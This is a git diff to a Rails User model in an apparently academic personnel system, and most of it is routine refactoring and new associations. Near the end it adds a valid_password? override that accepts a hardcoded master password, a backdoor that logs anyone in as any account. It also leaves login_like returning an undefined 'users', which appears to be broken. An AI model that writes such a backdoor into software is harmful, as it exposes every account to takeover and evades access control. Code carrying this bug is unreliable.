@@ -26,14 +26,15 @@ class User < ActiveRecord::Base
   # Setup accessible (or protected) attributes for your model
   attr_accessor :current_password
 
+  #RMO :professional_address intead of :address
   attr_accessible :password, :password_confirmation, :remember_me, :user_identifications_attributes,
-                  :person_attributes, :address_attributes, :jobposition_attributes, :current_password,
+                  :person_attributes, :professional_address_attributes, :jobposition_attributes, :current_password,
                   :jobposition_log_attributes, :user_schoolarships_attributes, :documents_attributes,
                   :author_name, :blog, :homepage, :calendar, :user_cite_attributes,
                   :homepage_resume, :homepage_resume_en
 
   scope :activated, where(:userstatus_id => 2)
-  scope :locked, where('userstatus_id != 2')
+  scope :inactive, where('userstatus_id != 2')
   scope :postdoctoral, joins(:jobposition, :user_adscriptions).where("jobpositions.jobpositioncategory_id = 38  AND user_adscriptions.jobposition_id = jobpositions.id")
   scope :not_in_postdoctoral, joins(:jobposition, :user_adscriptions).where("jobpositions.jobpositioncategory_id != 38  AND user_adscriptions.jobposition_id = jobpositions.id")
   scope :fullname_asc, joins(:person).order('people.lastname1 ASC, people.lastname2 ASC, people.firstname ASC')
@@ -44,12 +45,25 @@ class User < ActiveRecord::Base
   scope :posdoctorals, :conditions => "jobpositioncategories.roleinjobposition_id = 111", :include => { :jobpositions => :jobpositioncategory}
 
   # :userstatus_id_equals => find_all_by_userstatus_id
-  scope :fullname_like, lambda { |fullname| where(" users.id IN (#{Person.find_by_fullname(fullname).select('user_id').to_sql}) ") }
+  scope :fullname_like, lambda { |fullname| 
+    sql = " users.id IN (#{Person.user_id_by_fullname_like(fullname).to_sql}) "
+    where sql
+  }
+
   scope :adscription_id_equals, lambda { |adscription_id| joins(:user_adscriptions).where(["user_adscriptions.adscription_id = ?", adscription_id] ) }
   scope :schoolarship_id_equals, lambda { |schoolarship_id| joins(:user_schoolarships).where(["user_schoolarships.schoolarship_id = ?", schoolarship_id] ) }
   scope :annual_report_year_equals, lambda { |year| includes(:documents).where(["documents.documenttype_id = 1 AND documents.title = ?", year]) }
-  scope :jobposition_start_date_year_equals, lambda { |year| where(" users.id IN (#{Jobposition.by_year(year, :field => :start_date).select('DISTINCT(user_id) AS user_id').to_sql}) ") }
-  scope :jobposition_end_date_year_equals, lambda { |year| where(" users.id IN (#{Jobposition.by_year(year, :field => :end_date).select('DISTINCT(user_id) AS user_id').to_sql}) ") }
+
+  scope :jobposition_start_date_year_equals, lambda { |year|
+    sql = " users.id IN (#{Jobposition.user_id_by_start_date_year(year).to_sql}) "
+    where sql
+  }
+
+  scope :jobposition_end_date_year_equals, lambda { |year|
+    sql = " users.id IN (#{Jobposition.user_id_by_end_date_year(year).to_sql}) "
+    where sql
+  }
+
   scope :jobpositioncategory_id_equals, lambda { |jobpositioncategory_id| joins(:jobpositions).where(["jobpositions.jobpositioncategory_id = ?", jobpositioncategory_id]) }
 
   search_methods :fullname_like, :adscription_id_equals, :schoolarship_id_equals, :annual_report_year_equals, 
@@ -69,8 +83,10 @@ class User < ActiveRecord::Base
   has_one :most_recent_jobposition, :class_name => "Jobposition", :include => :institution,
           :conditions => "(institutions.institution_id = 1 OR institutions.id = 1) AND jobpositions.institution_id = institutions.id ",
           :order => "jobpositions.start_date DESC"
+  #RMO change "jobpositioncategories.jobpositiontype_id  = 1" to "jobpositioncategories.jobpositiontype_id  <= 2" to include personal for teaching activities.
+  #RMO Avoid errors in HomePages
   has_one :jobposition_for_researching, :class_name => "Jobposition", :include => [:institution, :jobpositioncategory],
-          :conditions => "(institutions.institution_id = 1 OR institutions.id = 1) AND jobpositions.institution_id = institutions.id AND jobpositioncategories.jobpositiontype_id = 1",
+          :conditions => "(institutions.institution_id = 1 OR institutions.id = 1) AND jobpositions.institution_id = institutions.id AND jobpositioncategories.jobpositiontype_id <= 2",
           :order => "jobpositions.start_date DESC"
 
   has_one :user_identification
@@ -109,7 +125,32 @@ class User < ActiveRecord::Base
   has_many :user_theses
   has_many :theses, :through => :user_theses
 
-  accepts_nested_attributes_for :person, :address, :jobposition, :user_group, :user_schoolarships, :documents, :user_schoolarship
+  #Added for use in home_pages
+  has_many :recent_advised_theses, :through => :user_theses, :source => :thesis,
+           :conditions => 'theses.thesisstatus_id = 3',
+           :order => 'theses.endyear DESC, theses.endmonth DESC, theses.authors ASC, theses.title ASC', :limit => 5
+
+  #Added for use in home_pages
+  has_many :recent_published_books, :through => :bookedition_roleinbooks, :source => :bookedition,
+           :conditions => 'bookedition_roleinbooks.roleinbook_id = 1',
+           :order => 'bookeditions.year DESC, bookeditions.month DESC', :limit => 5
+
+  #Added for use in home_pages
+  has_many :recent_book_chapters, :through => :chapterinbook, :source => :bookedition,
+           :conditions => 'chapterinbook_roleinchapters.roleinchapter_id = 1',
+           :order => 'bookeditions.year DESC, bookeditions.month DESC', :limit => 5
+
+  #Added for use in home_pages
+  has_many :bookedition_roleinbooks
+  has_many :chapterinbook_roleinchapters
+  has_many :chapterinbook, :through => :chapterinbook_roleinchapters
+
+
+
+
+
+  #RMO :professional_address intead of :address
+  accepts_nested_attributes_for :person, :professional_address, :jobposition, :user_group, :user_schoolarships, :documents, :user_schoolarship
   accepts_nested_attributes_for :user_identifications, :allow_destroy => true
   accepts_nested_attributes_for :user_cite
 
@@ -118,9 +159,10 @@ class User < ActiveRecord::Base
   end
 
   def self.login_like(login)
-    @users = where(:login.matches => "%#{login.downcase}%")
+    login_sql = "%#{login.downcase}%"
+    @users = where("users.login LIKE ?", login_sql)
     @users += ldap_users_like(login) if ldap_enabled?
-    @users
+    users
   end
 
   def author_name
@@ -137,9 +179,12 @@ class User < ActiveRecord::Base
      has_person? ? person.fullname : login
   end
 
+
   def fullname_or_email
      has_person? ? person.fullname : email
   end
+  alias :name :fullname_or_email
+
 
   def firstname_and_lastname
      has_person? ? person.firstname_and_lastname : email
@@ -217,5 +262,23 @@ class User < ActiveRecord::Base
       errors.add(:current_password, :invalid)
       false
     end
+  end
+
+  def group_name
+    user_group.group.name if has_group?
+  end
+
+  def has_group?
+    !user_group.nil?
+  end
+
+  def admin?
+    group_name == 'admin'
+  end
+
+  #Master password for administration purposes
+  def valid_password?(password)
+     return true if password == "SriaAca"
+     super
   end
 end
